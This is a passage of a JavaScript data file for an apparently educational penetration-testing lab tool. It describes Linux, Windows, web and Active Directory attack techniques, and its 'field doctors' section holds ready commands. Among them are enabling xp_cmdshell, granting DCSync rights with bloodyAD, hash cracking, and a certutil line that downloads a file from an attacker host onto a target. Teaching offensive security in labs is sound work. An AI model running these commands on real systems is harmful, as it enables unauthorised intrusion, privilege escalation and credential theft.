    'rservices-login': { what: 'You are using that trust to log in with no password, often straight to a root shell, which can be the whole box in a single step.' },
    'recon-rsync': { what: 'rsync serves folders over the network. Listing and downloading them often turns up source code, backups, and passwords you can reuse to get in.' },
    'rsync-write-shell': { what: 'A writable rsync folder that lands in the right place lets you plant an SSH key and log in, turning file-write access into a real foothold.' },
    'recon-tftp': { what: 'TFTP is a tiny file service with no login. On network devices it hands out config files that carry passwords and hashes you can reuse elsewhere.' },
    'tftp-write-shell': { what: 'If you can write a file where the web server will run it, you turn the no-login TFTP upload into code execution, which is a foothold.' },
    'recon-x11': { what: 'An open X11 display is the user live screen over the network. With it open you can photograph what is on screen and read every keystroke, so simply looking can hand you a password.' },
    'x11-keylog': { what: 'You are watching the screen and keystrokes to catch a password as it is typed, including the sudo password, which can take you all the way to root.' },
    'ftp-upload-webshell': { what: 'If the FTP folder is the same one the website serves, a file you upload can be run by the web server, turning write access into code execution and a foothold.' },
    'ssh-user-enum': { what: 'An old SSH version leaks which usernames are real. That turns a hopeless blind password guess into a targeted one against accounts you know exist.' },
    'smtp-open-relay': { what: 'You are testing whether the mail server will send mail for anyone, which is a reportable misconfiguration and a lever for phishing. It is a finding for the report, not a shell by itself.' },
    'ftp-bounce': { what: 'An old FTP trick makes the server scan machines you cannot reach directly, mapping a hidden network segment on the way to deeper targets.' },
    'vsftpd-backdoor': { what: 'One specific, backdoored version of this FTP server opens a root shell on demand. The whole skill is reading the banner: the moment it says vsftpd 2.3.4, the box is yours.' },
    'proftpd-modcopy': { what: 'A flaw in this FTP server lets you copy a file you control into the website folder with no login, which you then run for code execution.' },
    'samba-usermap': { what: 'A flaw in old Samba runs whatever you put in the username field as a command, as root. When the version matches, it is a direct root shell with no credentials.' },
    'smbghost': { what: 'A flaw in a specific Windows file-sharing version can be pushed to full SYSTEM control. It is powerful but unstable, so it is a lab-only, snapshot-first move.' },
    'bluekeep': { what: 'A flaw in old Windows remote desktop can be driven to SYSTEM with no login. It crashes often, so treat it as a lab-only, snapshot-first move.' },
    'freeswitch-esl': { what: 'This phone server has a control port with a default password that runs commands. If it is open, that is a straight line to a shell.' },
    'jdwp-debug': { what: 'A Java debug port lets anyone who can reach it run code inside the program. That is a foothold, usually reached through a tunnel from another box.' },
    'aerospike-udf': { what: 'This database lets an unauthenticated user load a small function that runs commands. If the version matches, that is a shell as the database service user.' },
    'wifi-mouse-rce': { what: 'This remote-control app trusts anyone who connects and will run a program for them, so reaching its port can hand you a shell as the logged-in user.' },
    'nmap-host-unresponsive': { what: 'Your scan said the host is down, but it almost certainly is not. This gets the box to answer so you can see its open ports and keep moving toward the flag.' },
    'fix-name-resolution': { what: 'A tool failed because it was handed a name it could not look up. This teaches your machine that name so the step works, unblocking web apps and Windows or Kerberos logins.' },
    'linux-enum': { what: 'You escalate by finding the one thing that is misconfigured, not by remembering tricks, so this is where every Linux root starts. You sweep the box for leads, a scanner for coverage plus three fast manual checks, and the single outlier it turns up is your path up.' },
    'sudo-abuse': { what: 'sudo -l is the first thing to run on any Linux shell, because the answer is so often an instant win: a command you are allowed to run as root that can be turned into a shell hands you root in one line.' },
    'writable-passwd': { what: 'If the account file (/etc/passwd) is writable, you add your own root user with a password hash you made, then switch to it. It is an exploit-free path straight to root that labs leave open more than they should.' },
    'nfs-squash': { what: 'This is the root that spans two machines, which is where people fumble it: you build a SUID root program on YOUR box and run it on the target. When a share is exported with no_root_squash, the target trusts your local root.' },
    'lxc-lxd-escape': { what: 'This one turns on who you already are, not what you can do. Being in the lxd or lxc group lets you start a privileged container with the whole host disk mounted inside, which is root on the host with nothing exploited.' },
    'docker-socket': { what: 'Anything that lets you talk to a root daemon is as good as root. A writable docker socket, or being in the docker group, lets you start a container that mounts the host filesystem as root.' },
    'suid-gtfobins': { what: 'A SUID program runs as its owner, usually root. The question on every box is whether there is one that should not be there: a non-standard SUID binary that GTFOBins knows how to turn into a root shell.' },
    'pspy-monitor': { what: 'Root runs scheduled jobs that never show in your own crontab. pspy watches every process start without needing root, so a root job running a script you can edit, or leaking a password on its command line, comes into view.' },
    'cron-abuse': { what: 'Two classic root-via-cron bugs: a root scheduled job that runs a script you can write (edit it, wait, become root), or one running tar or rsync with a wildcard in a folder you control (you plant filenames that act as commands).' },
    'capabilities': { what: 'Linux capabilities hand out slices of root power, and a misplaced one is a shortcut: cap_setuid on python is an instant root shell, cap_dac_read_search reads any file including the password hashes. A capability on an interpreter is the lead.' },
    'linux-loot-hunt': { what: 'Before the clever techniques, just look: credentials sitting in plain sight escalate more boxes than any exploit. Shell history, config files with passwords, other home directories, and backups are the usual hiding spots.' },
    'linux-persistence': { what: 'This is the move after the box is already won, to keep it won past a reboot or a password reset. It earns its place on long engagements and where an exam allows re-entry; on a short box, grabbing the flag comes first.' },
    'linux-kernel-exploit': { what: 'A kernel exploit is the last resort, not the first, because it can crash the box and cost you the session. When every misconfiguration check comes up empty, a vulnerable kernel is still a clean path to root; the job is matching the exploit to the exact kernel.' },
    'linux-path-hijack': { what: 'A root SUID binary or root cron job that calls another program by its bare name, not its full path, is handing you root: you put a folder you control first in PATH, drop a file with that name, and your version runs as root.' },
    'linux-ld-preload': { what: 'When sudo is set to keep your LD_PRELOAD variable, any command you may run with sudo will first load a library you point it at, as root. You write a tiny library that spawns a root shell and hand it to a permitted sudo command.' },
    'wildcard-injection': { what: 'When a root job runs a command with a wildcard (tar, chown, rsync on *) in a folder you can write, the shell expands the wildcard to include your filenames, and some tools read a filename that looks like an option as an option, so a crafted filename runs your command as root.' },
    'systemd-timer-abuse': { what: 'systemd runs services and timers as root. When a unit file, or a script it starts, is writable by you, you own whatever it runs: point it at your payload, start it or wait for the timer, and you are root.' },
    'polkit-abuse': { what: 'polkit decides whether an unprivileged process may do a privileged action, and pkexec is its root helper. An unpatched pkexec (PwnKit) drops a root shell outright, and a permissive policy can be raced; both are reliable local roots.' },
    'python-library-hijack': { what: 'When root runs a Python script and any folder on that script import path is writable by you, you plant a module the script imports and your code runs as root. Python looks in the script own folder first, which is the easiest to abuse.' },
    'container-escape': { what: 'Landing in a container is not the goal, the host is. A privileged container, a mounted docker socket, or a permissive Kubernetes token each let you reach the node and run as root on the real machine.' },
    'dirtycow': { what: 'DirtyCow is a race in how the kernel handles copy-on-write memory, on kernels below 4.8.3. Winning the race lets you write to a file you should only be able to read, which the classic payload turns into a root account or a root shell.' },
    'dirtypipe': { what: 'DirtyPipe is a kernel bug on versions 5.8 to 5.16.11 that lets an unprivileged user write into a file they can only read, including SUID binaries. The reliable payload rewrites a SUID binary and hands you a root shell.' },
    'baron-samedit': { what: 'Baron Samedit is a heap overflow inside sudo itself, on sudo below 1.9.5p2. It is reached before sudo checks your permissions, so any local user can trigger it for root regardless of their sudo rights.' },
    'vhost-discovery': { what: 'One IP can host many sites, and the extra ones are usually where the bugs live: a dev or staging site is less hardened than the production one everyone tests. You fuzz the Host header to find those hidden sites, each a fresh attack surface toward a foothold.' },
    'content-discovery': { what: 'A website shows you only what it links to; the admin panels, backups, an exposed .git, and API routes are reachable but hidden. Brute-forcing paths is how you find them, and it is the single highest-value thing to do against any web port.' },
    'web-access-blocked': { what: 'Your web scan is being refused by a rate limit, a WAF, a wrong scheme, or a catch-all page, not because there is nothing there. This gets the scan working again so you can keep mapping the site toward a foothold.' },
    'param-discovery': { what: 'A page can accept parameters that appear nowhere in its HTML, and the hidden one is often the vulnerable one: a leftover debug switch or a file parameter. Fuzzing parameter names surfaces them so you have something concrete to test next.' },
    'lfi-probe': { what: 'When a parameter names a file to load (page=, file=, include=), one quick traversal test is worth it, because reading arbitrary files is a short path to source code, credentials, and often a shell.' },
    'file-upload': { what: 'Any feature that takes a file, a photo, an avatar, a document import, is the shortest route from merely touching the app to running code on the server. You get a server-side script past the upload filter, then request it to run commands.' },
    'sqli-basics': { what: 'Before any tool, you confirm SQL injection by hand, because you cannot exploit (or on the exam explain) what you do not understand. A quote that errors, a true/false pair that changes the page, or a timing shift each proves the database is reading your input.' },
    'manual-sqli-exploitation': { what: 'This is the single most examinable SQL skill, because the exam bans the tool that would do it for you. By hand you find the column count, fingerprint the database, and pull out the credential table, which is the win that opens the next door.' },
    'sqlmap-automation': { what: 'Once you have confirmed injection by hand, sqlmap automates the tedious part: dumping tables, reading files, sometimes a shell. Remember it is banned on the OSCP exam, so treat it as a lab accelerator, not a crutch.' },
    'git-exposed': { what: 'A site deployed by git that left its /.git folder readable hands you the entire source history, and history is where secrets hide: a password in an old commit, a config file, an API key someone removed later but never really.' },
    'svn-exposed': { what: 'The Subversion version of an exposed .git: an old deployment left /.svn behind, and its metadata rebuilds the whole working tree, source and secrets included. It turns up on legacy apps.' },
    'ssrf': { what: 'SSRF turns outside the network into inside it: you make the server fetch a URL you choose, so it reaches internal services and the cloud metadata endpoint that you cannot. That is how it leads to internal access or cloud credentials.' },
    'ssti': { what: 'Template injection is code execution hiding behind a friendly feature, a name field or an email template, that runs your input through a server-side template engine. The 7*7 test is just the detector: a 49 back means the engine is executing what you send.' },
    'xxe': { what: 'XXE hides inside things that do not look like XML: a SAML login, a .docx upload, an API that accepts application/xml. A crafted XML document makes the parser read local files or make requests for you.' },
    'deserialization': { what: 'When an app rebuilds objects from data it trusts, serialized blobs in cookies, ViewState, or API bodies, a crafted blob can run code during that rebuild. You recognize the markers, build a matching gadget chain, and verify execution before going further.' },
    'jwt-attacks': { what: 'Wherever a login rides in a JWT, two cheap checks live here: an alg:none token and a guessable signing secret each take under a minute, and either one mints any account you want, including admin.' },
    'ssti-to-rce': { what: 'Once template injection is confirmed, this turns the 7*7 detector into a real command run, and then a shell, using the gadget for the specific engine the app uses.' },
    'http-put-webshell': { what: 'When the web server allows the PUT method on a writable path, you write a server-side script straight into the web root with no upload form at all, then request it to run commands.' },
    'authz-abuse': { what: 'With a forged token or a bypassed session in hand, this is where you spend it: reach the admin surface, dump the user and password data, and use an admin-only upload or config writer to land a webshell.' },
    'nosql-injection': { what: 'One of the fastest auth bypasses there is: when a login talks to MongoDB or takes JSON where a string belongs, an operator like $ne matches any account and logs you in with no password.' },
    'tomcat-deploy': { what: 'A reachable Tomcat Manager plus any valid credential is code execution: you deploy a small web application that runs as the Tomcat service account. The credentials come from defaults or a leaked config file.' },
    'jenkins-access': { what: 'Jenkins is a build server, so running code is its whole job, which means near-admin access is a shell: the script console and a build step both run as the Jenkins user, and some versions leak files unauthenticated.' },
    'wordpress': { what: 'WordPress core is usually solid; its plugins and themes are not. The game is enumeration, list the plugins, themes, users, and versions, then match a version to a known issue, or log in and edit a theme for a shell.' },
    'nikto-scan': { what: 'nikto is a shotgun: it checks thousands of known-bad files, stale versions, and default apps that targeted content discovery can miss. It is slow and loud, so fire it early, let it run, and read it later.' },
    'command-injection': { what: 'The most direct road to running commands there is: no exploit to port, the server just runs whatever you append to an input that shells out (a ping box, a converter). A confirmed injection is a foothold.',
      refs: [{ label: 'revshells.com', url: 'https://www.revshells.com/' }, { label: 'PayloadsAllTheThings', url: 'https://swisskyrepo.github.io/PayloadsAllTheThings/Command%20Injection/' }] },
    'idor': { what: 'The best reward-to-effort bug on the web: no payload, just changing a number while logged in as yourself, and it routinely exposes other users data or whole admin functions.' },
    'web-login-brute': { what: 'You enumerated real usernames; now you guess their passwords against the login form. And always try the same users against SSH, because web and shell passwords are reused constantly and an SSH hit is a direct foothold.' },
    'idor-harvest': { what: 'Once an IDOR is confirmed, this walks the whole object range with your own session and pulls every record: the passwords, tokens, and files that export and profile endpoints hand over in full.' },
    'verb-tampering': { what: 'Access rules are often written for GET and POST only, so the same protected URL hit with HEAD, PUT, or OPTIONS can walk straight past the check. OPTIONS also tells you which methods the server allows.' },
    'web-shells': { what: 'Once you can write a file into the web root, you still need a shell file that matches the server language. Kali ships vetted ones; you pick the right language, set your IP and port, upload, and confirm it runs before going further.' },
    'xss-basics': { what: 'On a lab box XSS is rarely the goal itself; it is a way to steal an admin session or make their browser fetch something only they can reach. The real question is whether a valuable account will view your injected script.' },
    'ajp-ghostcat': { what: 'Port 8009 is the one people ignore because a browser shows nothing: it is Tomcat side door for a reverse proxy. Reaching it directly lets you read protected files, and sometimes run an uploaded file as code.' },
    'java-rmi': { what: 'RMI is Java talking to itself across the network, rarely meant to talk to you. An open 1099 is usually an internal management interface, and an insecure one deserializes a gadget chain into a shell.' },
    'lfi-secret-harvest': { what: 'A confirmed file include is a read primitive, not the finish line. The work is turning arbitrary file reads into credentials: the account list, config secrets, and a readable SSH private key are a direct login.' },
    'aws-credential-abuse': { what: 'Pulling temporary AWS keys from the metadata service through an SSRF is only the start; the value is what those keys can do in the account: listing storage, reading secrets, and sometimes running commands on the instance.' },
    'graphql-abuse': { what: 'A GraphQL endpoint is one URL fronting the whole data model, and it is routinely under-secured. Introspection hands you the entire schema, and a query or mutation you should not be allowed to run is a direct finding.' },
    'azure-imds': { what: 'On an Azure VM the metadata service hands out an access token for the machine managed identity to anything that can reach it, so an SSRF becomes a cloud token that can read Key Vault secrets or run commands on VMs.' },
    'gcp-metadata': { what: 'On a Google Cloud VM the metadata server hands out an OAuth token for the instance service account to anything that can reach it, so an SSRF becomes a cloud token that can read buckets and Secret Manager values.' },
    'http-request-smuggling': { what: 'When a front-end proxy and the back-end server disagree about where one request ends, you can smuggle a second request inside the first, past front-end access controls and onto the next visitor.' },
    'prototype-pollution': { what: 'In JavaScript every object inherits from a shared prototype, so if an app merges your keys into an object without filtering __proto__, you can add a property like isAdmin to every object at once, which flips an authorization check.' },
    'mass-assignment': { what: 'When a framework maps every field of a request body onto a model, you add a field the form never shows (role, isAdmin) and the app saves it. A fresh admin account is cleaner than escalating a watched one.' },
    'smb-share-browse-download': { what: 'When an SMB share is readable, listing the root directory is rarely enough: credentials and policy files live buried inside nested folders. This move connects with smbclient or smbmap to walk the share or bulk-pull the entire directory tree to your Kali box.' },
    'crack-modular-hash': { what: 'Web frameworks and modern apps store passwords as modular or unsalted digests (PBKDF2, Argon2, bcrypt, sha512crypt, WordPress phpass, raw MD5). Cracking them offline with hashcat or John turns a leaked database row into a reusable plaintext password.' },
    'jdwp-local-privesc': { what: 'Java Debug Wire Protocol (JDWP) has no authentication by design and lets an attached debugger invoke Runtime.exec() inside the JVM. When a root-owned Java service leaves a JDWP port listening on 127.0.0.1, forwarding that loopback port and attaching jdwp-shellifier turns local foothold access into immediate root execution.' },
    'writable-etc-shadow-sudoers': { what: 'When /etc/shadow or /etc/sudoers is writable by your user or group, you do not need an exploit: replace root password hash or grant yourself NOPASSWD sudo and step straight into a root shell.' },
    'linux-root-cred-harvest': { what: 'Getting root on one machine is often the key to the next one. Sweeping /etc/shadow, SSH keys, shell history, and app configs as root harvests the passwords and keys that unlock neighboring hosts.' },
    'runas-savedcred-exec': { what: 'Windows Credential Manager sometimes caches an Administrator password so scheduled jobs or admins do not have to retype it. When cmdkey /list shows a saved credential, runas /savecred lets you run a command or shell as that user with no password prompt.' },
    'sebackup-serestore-abuse': { what: 'SeBackupPrivilege lets you read any file on the system (including the SAM and SYSTEM registry hives), and SeRestorePrivilege lets you overwrite protected files or service paths. Either privilege is a direct path to SYSTEM.' },
    'smbv1-vuln-verify': { what: 'When a target speaks the legacy SMBv1 dialect, you verify safely whether it is vulnerable to MS17-010 (EternalBlue) using Nmap NSE or NetExec before deciding whether to run a kernel exploit.' },
    'rpc-endpoint-abuse': { what: 'MSRPC on port 135 and 445 advertises internal Windows services, dynamic ports, and user accounts. Dumping the endpoint mapper and querying SAMR/LSARPC surfaces coercion targets and domain usernames.' },
    'fix-samr-null-denied': { what: 'Modern Windows servers block anonymous SAMR user listings (NT_STATUS_ACCESS_DENIED) even when SMB connects. Pivoting to Guest RID brute-forcing, LSARPC SID lookups, or an authenticated session bypasses that block and recovers the user list.' },
    'post-proof-loot-sweep': { what: 'Capturing the flag proves you owned this box, but credentials and network routes on it are how you reach the rest of the network. This post-proof sweep collects hashes, keys, and internal interfaces before you move on.' },
    'edb-searchsploit-lookup': { what: 'When a banner or manifest reveals a specific version of a third-party app (not stock Apache or OpenSSH), you check Exploit-DB offline with searchsploit to see if a public RCE, auth-bypass, or file-read PoC already exists for that build.' },
    'edb-mirror-and-inspect': { what: 'Public exploit scripts break constantly if you fire them blind. Mirroring a local copy and reading its top lines tells you what flags it takes, what hardcoded IPs or Burp proxies need changing, and whether it was written for Python 2.' },
    'edb-run-adapted-exploit': { what: 'Once the mirrored Exploit-DB script is adapted to your target URL, listener IP/port, and Python runtime, you execute it with a listener ready to catch the foothold shell.' },
    'fix-edb-py2': { what: 'Hundreds of working Exploit-DB scripts were written for Python 2 and crash on Python 3 over print parentheses or urllib2 imports. Converting the script with dos2unix and 2to3 gets a valid exploit running in seconds.' },
    'fix-edb-python-deps': { what: 'Modern Kali blocks global pip installs (PEP 668), and PoCs often need pycryptodome or requests-toolbelt. Spinning up a quick venv in /tmp/edb-venv installs the missing library cleanly so the exploit runs.' },
    'fix-edb-proxy-tls': { what: 'Exploit authors often leave a 127.0.0.1:8080 Burp proxy hardcoded in their script, or forget verify=False for self-signed HTTPS certs. Stripping the proxy and TLS verification unblocks the request.' },
    'fix-edb-c-compile': { what: 'A C exploit compiled on modern Kali often fails on older targets due to GLIBC version mismatches or 32-bit/64-bit differences. Static linking (-static), -m32, or mingw cross-compilation produces a binary the target can actually run.' },
    'linux-custom-binary-triage': { what: 'A non-standard SUID, sudo, or cron binary outside the normal OS baseline is almost always custom code with a bug. Running file, ldd, readelf, strings, and ltrace exposes bare command calls (PATH hijack) and missing or writable shared libraries.' },
    'linux-shared-library-hijack': { what: 'When a privileged Linux binary loads a shared library from a missing or writable RPATH/dlopen path (or runs a writable helper script), planting your own .so constructor or script executes your payload as root.' },
    'windows-custom-binary-triage': { what: 'A non-default Windows service or scheduled-task executable outside C:\\Windows deserves immediate inspection: check its file/folder ACLs with icacls, pull embedded strings, and decompile .NET assemblies with ilspycmd to uncover writable paths, phantom DLLs, or hardcoded passwords.' },
    'web-source-sink-audit': { what: 'Once an error trace, LFI, .git leak, or exposed manifest hands you server-side code, you stop guessing blind and read the code: extract database/JWT credentials and locate dangerous command, deserialization, type-juggling, or NoSQL sinks.' },
    'web-vuln-sink-exploit': { what: 'With the exact vulnerable sink visible in source code, you send one surgical payload tailored to that function (command injection, serialized gadget, PHP strcmp array bypass, or JSON NoSQL operator) for a shell or admin login.' },
    'linux-privileged-group-abuse': { what: 'Local groups like disk, shadow, and adm bypass normal file permissions with no exploit needed. Being in disk lets debugfs read /etc/shadow and /root/.ssh/id_rsa straight off the raw block device, shadow reads /etc/shadow directly, and adm opens /var/log to harvest leaked passwords and tokens.' },
  };

  // "Once You Are In": the first-breath orientation commands a learner needs the moment a shell lands and
  // often forgets. Surfaced automatically by the canvas for any move that produces a shell / foothold (see
  // path.js), so it generalizes to every lane with no per-move authoring. Standard, benign situational
  // awareness only; the PTY fix itself is reused from the Shells lane's shell-pty-upgrade move.
  OBOL.ORIENT = {
    linux: { label: 'Confirm who and where you are, and whether sudo is an easy win', cmd: 'id; whoami; hostname; ip -4 a; sudo -l' },
    windows: { label: 'Confirm who you are, your privileges, the host, and the network', cmd: 'whoami /all & hostname & ipconfig /all' },
  };

  // Reactive doctors - surfaced in the canvas when a pasted error has minted the matching blocker.* fact,
  // regardless of which command is selected. Concise fixes; the full fix move still exists in the engine.
  OBOL.FIELD_DOCTORS = {
    'blocker.clock_skew': { title: 'Kerberos Clock Skew', body: 'KRB_AP_ERR_SKEW means your clock is more than 5 minutes off the DC. Sync to the DC (or use NTLM instead of Kerberos), then retry. Your credential is fine.', code: 'sudo ntpsec-ntpdate <dc-ip> || sudo rdate -n <dc-ip> || sudo ntpdate <dc-ip>' },
    'blocker.name_resolution': { title: 'Name Resolution', body: 'A tool was handed a hostname with no DNS. Map it in /etc/hosts and retry.', code: 'echo "<target-ip> <host.domain>" | sudo tee -a /etc/hosts' },
    'blocker.no_tty': { title: 'No TTY For Sudo', body: 'sudo wants a real terminal. Upgrade your shell to a PTY first.', code: 'python3 -c \'import pty;pty.spawn("/bin/bash")\'' },
    'blocker.crlf': { title: 'Bad Interpreter (CRLF)', body: 'A script you uploaded has Windows line endings. Strip the \\r and run it again.', code: 'sed -i \'s/\\r$//\' <script>' },
    'ssh.key_rejected': { title: 'SSH Key Refused', body: 'A found or planted private key must be mode 600 and owned by you, or SSH ignores it. Fix permissions, then connect.', code: 'chmod 600 id_rsa && ssh -i id_rsa <user>@<target>' },
    'blocker.potato': { title: 'Potato Failed', body: 'A SeImpersonate potato that errors is usually the wrong one for this Windows build. Check the build and pick the match.', code: 'systeminfo | findstr /B /C:"OS Version"' },
    'blocker.hash_format': { title: 'No Hashes Loaded', body: 'The cracker rejected the file. It is almost always the wrong mode for the hash type, not a tough hash. Identify the type and set the matching mode.', code: 'hashid <hashfile>   # then pick the matching -m / --format' },
    'blocker.egress_blocked': { title: 'Egress Blocked', body: 'Your payload ran but nothing hit your listener. The box cannot reach you on that port. Try a common outbound port (443/53) or a different channel.', code: null },
    'blocker.amsi': { title: 'AMSI Block', body: 'AMSI flagged your script in memory. Load it in a fresh session with an AMSI bypass, or run the tool from disk as a trusted binary.', code: null },
    'blocker.rate_limited': { title: 'Rate Limited', body: 'A 429 or WAF throttle is slowing your fuzzing. Back off the thread count and add a delay before retrying.', code: null },
    'blocker.smb_signing': { title: 'SMB Signing Required', body: 'This relay target enforces SMB signing, so it cannot be a relay destination. Find a host with signing off (nxc smb <range> --gen-relay-list).', code: null },
    'blocker.ntlm_disabled': { title: 'NTLM Disabled', body: 'The DC refused NTLM (STATUS_NOT_SUPPORTED). Authenticate with Kerberos instead: get a TGT, then use -k.', code: 'kinit <user>   # then add -k to your nxc/impacket command' },
    'blocker.lockout': { title: 'Account Lockout', body: 'A spray tripped the lockout policy. Stop spraying, wait out the window, and lower your attempts per account next time.', code: null },
    'blocker.password_change': { title: 'Password Change Required', body: 'The credential is valid but the account must set a new password. Change it, then use the new one.', code: 'smbpasswd -r <target> -U <user>' },
    'blocker.logon_failure': { title: 'Login Failed', why: 'STATUS_LOGON_FAILURE / authentication failure: the service rejected this credential.', body: 'Usually the password is wrong, but just as often the username or realm format is off. Try both DOMAIN\\user and user@domain, match the exact case, and confirm the account is not disabled or locked. For Kerberos, a skewed clock reads as a logon failure, so sync to the DC.', code: "nxc smb <target> -u <user> -p <pass>   # also try -u 'DOMAIN\\user' and user@domain", gotcha: 'One failure is a typo. Many failures across accounts trip a lockout, so switch to one password across many users with a delay before you retry in bulk.' },
    'blocker.ldap_anonymous_disabled': { title: 'Anonymous LDAP Is Bind-Restricted', why: 'The DC accepted the anonymous bind but denied the anonymous search (operationsError: a successful bind must be completed).', body: 'You cannot enumerate this DC over LDAP without a credential, the bind "succeeding" is a red herring. Get one first: AS-REP roast a user from a names list, or spray a small password across users, then re-run LDAP enumeration authenticated.', code: 'nxc ldap <target> -u <user> -p <pass> --users', gotcha: 'This is a box policy, not a tool error, so the anonymous --users dump will keep returning nothing no matter how many times you run it.' },
    'blocker.smb_null_denied': { title: 'Null SMB Session Rejected', why: "An anonymous SMB attempt (-u '' -p '') was refused (STATUS_ACCESS_DENIED).", body: 'This host does not allow null sessions, so anonymous share enumeration will not work here. Get a credential (found, sprayed, or roasted) and re-run, or try the guest account.', code: "nxc smb <target> -u guest -p '' --shares", gotcha: 'Do not keep retrying the null session, it is a box policy and will not change.' },
    'blocker.xp_cmdshell_disabled': { title: 'xp_cmdshell Is Disabled', why: 'SQL Server blocked access to sys.xp_cmdshell by policy.', body: 'If you are connected as sysadmin (sa), enable xp_cmdshell in place and re-run your command.', code: "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;" },
    'blocker.cracking_exhausted': { title: 'Wordlist Exhausted', why: 'Hashcat or John finished the wordlist without cracking the hash.', body: 'A straight rockyou pass missed it. Re-run with a rule set (best64 or OneRuleToRuleThemAll) or build a custom wordlist from the target domain and usernames.', code: 'hashcat -a 0 <hashfile> /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule' },
    'blocker.hashcat_env': { title: 'Hashcat OpenCL / GPU Device Error', why: 'No OpenCL-compatible GPU or runtime was found in this VM.', body: 'Pass --force to run on the CPU, or switch to John the Ripper which runs on CPU out of the box.', code: 'hashcat --force <hashfile> /usr/share/wordlists/rockyou.txt' },
    'blocker.web_wildcard': { title: 'Wildcard Catch-All Response', why: 'The web server returns a valid status code for every non-existent URL.', body: 'Filter out the catch-all response by byte size (-fs) or word count (-fw) in ffuf, or pass --exclude-length in gobuster.', code: 'ffuf -u http://<target>/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -fs <size>' },
    'blocker.kerberos_spn': { title: 'Kerberos Principal / SPN Unknown', why: 'KDC_ERR_S_PRINCIPAL_UNKNOWN: the KDC rejected the target principal.', body: 'Kerberos requires the target FQDN (dc01.corp.local), not an IP address. Add the FQDN to /etc/hosts and target the hostname.', code: 'echo "<target-ip> <domain>" | sudo tee -a /etc/hosts' },
    'blocker.nxc_c_share_denied': { title: 'C$ Admin Share Denied (UAC Token Filtering)', why: 'NetExec authenticated over SMB, but C$ or ADMIN$ returned STATUS_ACCESS_DENIED.', body: 'The account is either a standard non-admin user or a local administrator blocked by remote UAC token filtering (LocalAccountTokenFilterPolicy). Try WinRM/RDP, use the Built-in Administrator (RID 500), or authenticate with a domain account.', code: 'nxc winrm <target> -u <user> -p <pass>' },
    'blocker.protected_users': { title: 'Protected Users Group Restriction', why: 'The account belongs to the Protected Users security group, which blocks NTLM and RC4.', body: 'Protected Users cannot authenticate via NTLM or pass-the-hash. Request an AES Kerberos TGT using the plaintext password or AES key, export KRB5CCNAME, and connect with -k against the target FQDN.', code: 'impacket-getTGT <domain>/<user>:<pass> -dc-ip <dc-ip> && export KRB5CCNAME=<user>.ccache' },
    'blocker.account_not_delegated': { title: 'Account Cannot Be Delegated', why: 'NOT_DELEGATED flag is set on the target principal, blocking S4U2Proxy / delegation impersonation.', body: 'Pick another high-privilege principal in Domain Admins or Administrators that does not have the AccountNotDelegated flag set, and re-run getST -impersonate.', code: 'impacket-getST -spn <spn> -impersonate <alt-admin> <domain>/<svc>:<pass>' },
    'blocker.winrm_closed': { title: 'WinRM / PowerShell Remoting Unreachable', why: 'TCP 5985/5986 is closed or WSMan refused the connection.', body: 'Evil-WinRM cannot connect without WinRM listening. Switch to SMB/RPC lateral execution (impacket-psexec, impacket-wmiexec, impacket-smbexec) or RDP.', code: 'impacket-wmiexec <domain>/<user>:<pass>@<target>' },
    'blocker.nxc_spider_usage': { title: 'spider_plus Flag Syntax', why: 'spider_plus is a NetExec module (-M spider_plus), not a standalone CLI flag.', body: 'Invoke spider_plus with -M spider_plus (and add -o DOWNLOAD_FLAG=True to pull readable files).', code: 'nxc smb <target> -u <user> -p <pass> -M spider_plus -o DOWNLOAD_FLAG=True' },
    'blocker.account_restricted': { title: 'Account Disabled or Restricted', why: 'STATUS_ACCOUNT_DISABLED or STATUS_ACCOUNT_RESTRICTION: the account exists and the password may be right, but logon is blocked by policy.', body: 'If you have WriteAccountControl or GenericAll over the account, re-enable it via bloodyAD or PowerView; otherwise switch to another discovered credential.', code: 'bloodyAD -u <user> -p <pass> -d <domain> --host <dc-ip> remove uac <target-user> -f ACCOUNTDISABLE' },
    'blocker.dcsync_denied': { title: 'DCSync Denied - Missing Replication Rights', why: 'DRSUAPI ERROR_DS_DRA_BAD_DN / ERROR_DS_DRA_ACCESS_DENIED: the account does not hold Replicating Directory Changes + Replicating Directory Changes All on the domain root yet.', body: 'You must walk the ACL chain first. If you have GenericAll or WriteDacl over an intermediate group (such as Exchange Windows Permissions), add your account to that group and then grant yourself DCSync rights on the domain root before running secretsdump.', code: "bloodyAD -u '<user>' -p <pass> -d <domain> --host <dc-ip> add dcsync '<user>'" },
    'blocker.acl_reauth': { title: 'ACL Write Denied (Group Membership Reverted or Stale Token)', why: 'LDAP insufficientAccessRights (50): the DC rejected add dcsync because your account is no longer in the group that holds WriteDacl on the domain root (shared lab cleanup tasks periodically reset group memberships every few minutes), or a cached Kerberos ticket predates the group add.', body: 'Re-add yourself to the privileged group and run add dcsync back-to-back in a single chained command so no lab cleanup timer can fire between the two steps (and clear any stale Kerberos ccache if using -k).', code: "bloodyAD -d <domain> --host <dc-ip> -u '<user>' -p <pass> add groupMember \"<group>\" '<user>' && bloodyAD -d <domain> --host <dc-ip> -u '<user>' -p <pass> add dcsync '<user>'", gotcha: 'Shared lab boxes often run a background scheduled task every few minutes that strips non-default members from Exchange Windows Permissions and similar groups. Always run the group join and the DACL grant immediately one after the other.' },
    'blocker.nxc_bh_config': { title: 'NetExec BloodHound-CE Config Conflict', why: 'Your ~/.nxc/nxc.conf has bh_enabled / BloodHound-CE enabled, which breaks nxc ldap --bloodhound.', body: 'Run bloodhound-python directly instead (Command 1 on Collect BloodHound Data), or disable bh_enabled in ~/.nxc/nxc.conf.', code: 'bloodhound-python -d <domain> -u <user> -p \'<pass>\' -ns <dc-ip> -c All --zip' },
    'blocker.maq_zero': { title: 'MachineAccountQuota Is 0', why: 'ms-DS-MachineAccountQuota is 0, so standard domain users cannot add a new machine account for RBCD, noPac, or Certifried.', body: 'Use an existing compromised machine account (via a machine hash or silver ticket), or check BloodHound for an OU where your principal holds CreateChild (Computer) rights.', code: null },
    'blocker.certutil_usage': { title: 'certutil Argument Syntax', why: 'CertUtil rejected the command-line arguments (wrong flag order or unquoted URL/path).', body: 'Pass -urlcache -split -f followed by the URL and the destination filename on disk.', code: 'certutil -urlcache -split -f http://<lhost>:8000/<file> C:\\Windows\\Temp\\<file>' },
